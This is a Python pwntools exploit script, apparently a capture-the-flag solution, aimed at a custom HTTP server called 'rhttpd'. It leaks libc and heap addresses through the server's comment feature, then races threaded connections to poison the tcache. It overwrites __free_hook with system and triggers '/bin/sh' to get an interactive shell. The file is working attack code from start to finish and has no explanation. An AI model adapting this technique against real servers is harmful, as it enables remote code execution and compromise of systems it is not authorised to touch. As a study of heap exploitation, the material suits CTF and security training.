from pwn import *
import threading
import time

p = process("rhttpd", env = {"LD_PRELOAD":"./libCoroutine.so"})
elf = ELF("rhttpd")
libc = ELF("./libc-2.31.so")
context.arch = "amd64"
context.log_level = "debug"

test = b"GET /index.html HTTP/1.1\r\n\r\n"

def get_conn():
    r = remote("127.0.0.1", port)
    return r

def register(r, username, password):
    get_conn()
    req = b"GET /register?passwd=" + password
    req += b"&name=" + username
    req += b"&re_passwd=" + password
    req += b" HTTP/1.1\r\n\r\n"
    r.send(req)
    
def login(r, username, password):
    req = b"GET /login?passwd=" + password
    req += b"&name=" + username
    req += b" HTTP/1.1\r\n\r\n"
    r.send(req)
    
def set_comment(r, username, password, comment, length:int):
    req = b"POST /submit HTTP/1.1\r\n"
    req += b"Cookie: name=" + username + b"; pass=" + password + b"\r\n"
    req += b"Content-Length: " + str(length).encode() + b"\r\n"
    req += b"\r\n"
    req += comment
    r.send(req)
    
def get_comment(r, username, password):
    req = b"GET /submit.html HTTP/1.1\r\n"
    req += b"Cookie: name=" + username + b"; pass=" + password + b"\r\n"
    req += b"\r\n"
    r.send(req)
    
def block_in_read():
    r = get_conn()
    comment = b"word=B"
    th = threading.Thread(target=set_comment, args=(r, b"eqqie", b"123456", comment, 0x100))
    th.setDaemon(True)
    th.start()
    
def block_to_hold_vtable(fake_vtb, one_gadget):
    r = get_conn()
    comment = p64(fake_vtb) + p64(one_gadget)
    th = threading.Thread(target=set_comment, args=(r, b"eqqie", b"123456", comment, 0x20))
    th.setDaemon(True)
    th.start()
    
    
# base: 0x0000555555554000
def exp():
    global port
    p.recvuntil(b"http://54.176.255.241:")
    port = int(p.recv().decode())
    
    # break
    #gdb.attach(p, "b *0x0000555555554000+0x1d980\nc\n")
    #gdb.attach(p, "b *0x0000555555554000+0x1d857\nc\n")

    # register new user
    r1 = get_conn()
    register(r1, b"eqqie", b"123456")
    r1.recv()
    
    # new comment
    r2 = get_conn()
    comment = b"word="+b"A"*0x500
    set_comment(r2, b"eqqie", b"123456", comment, len(comment))
    r2.recv()
    r3 = get_conn()
    comment = b"word="+b"A"*0x1
    set_comment(r3, b"eqqie", b"123456", comment, len(comment))
    r3.recv()

    
    # leak libc
    r4 = get_conn()
    get_comment(r4, b"eqqie", b"123456")
    r4.recvuntil(b"Comment: ")
    libc_leak = u64(r4.recv(6).ljust(8, b"\x00"))
    libc_base = libc_leak - 0x1ec041
    system = libc_base + libc.symbols[b"system"]
    free_hook = libc_base + libc.symbols[b"__free_hook"]
    one_gadget = libc_base + 0xe6e79
    print("libc_leak:", hex(libc_leak))
    print("libc_base:", hex(libc_base))
    print("system:", hex(system))
    print("free_hook:", hex(free_hook))
    print("one_gadget:", hex(one_gadget))
    
    # leak heap
    r5 = get_conn()
    comment = b"word="+b"B"*0x10
    set_comment(r5, b"eqqie", b"123456", comment, len(comment))
    r5.recv()
    r6 = get_conn()
    get_comment(r6, b"eqqie", b"123456")
    r6.recvuntil(b"B"*0x10)
    heap_leak = u64(r6.recv(6).ljust(8, b"\x00"))
    heap_base = heap_leak - 0x4f4f0
    fake_vtb = heap_base + 0x55018
    print("heap_leak:", hex(heap_leak))
    print("heap_base:", hex(heap_base))
    print("fake_vtb:", hex(fake_vtb))

    
    # Attack tcache
    r7 = get_conn()
    comment = b"word="+b"B"*0x130
    set_comment(r7, b"eqqie", b"123456", comment, len(comment))
    r7.recv()

    #gdb.attach(p, "b *0x0000555555554000+0x1d987\nc\n")
    #gdb.attach(p, "b *0x0000555555554000+0x1db2a\nc\n")
    
    ## block & hold the chunk_1
    r8 = get_conn()
    comment = b""
    set_comment(r8, b"eqqie", b"123456", comment, 0x130)
    
    ## free chunk_1 and get a new chunk to update comment
    r9 = get_conn()
    comment = b"word="+b"C"*0x140
    set_comment(r9, b"eqqie", b"123456", comment, len(comment))
    r9.recv()
    
    ## continue write chunk_1
    #gdb.attach(p, "b *0x0000555555554000+0x1db2f\nc\n")
    r8.send(b"D"*0x130)
    #gdb.attach(p, "b *0x0000555555554000+0x9d05\nc\n")
    #gdb.attach(p)
    
    ## there will be a loop chain (magic...)
    
    ## rewrite loop chain than link to __free_hook
    r10 = get_conn()
    r10.send(b"GET " + p64(free_hook-0x10)*2+b"D"*0x120 + b" HTTP/1.1\r\n\r\n")
    r10.recv()
    ## get first chunk (not only on this way)
    r11 = get_conn()
    r11.send(b"GET /index.html HTTP/1.1\r\nPayload1: " + b"D"*0x130 + b"\r\n")
    
    ## block again & get __free_hook by using buffer
    #gdb.attach(p, "b *0x0000555555554000+0x1dad8\nc\n")
    r12 = get_conn()
    comment = b"/bin/sh;"*2 + p64(system)*2
    set_comment(r12, b"eqqie", b"123456", comment, 0x130)
    time.sleep(1)
    r12.send(b"E"*0x110)
    print("free_hook:", hex(free_hook))
    
    #gdb.attach(p)
    p.interactive()
    
if __name__ == "__main__":
    exp()
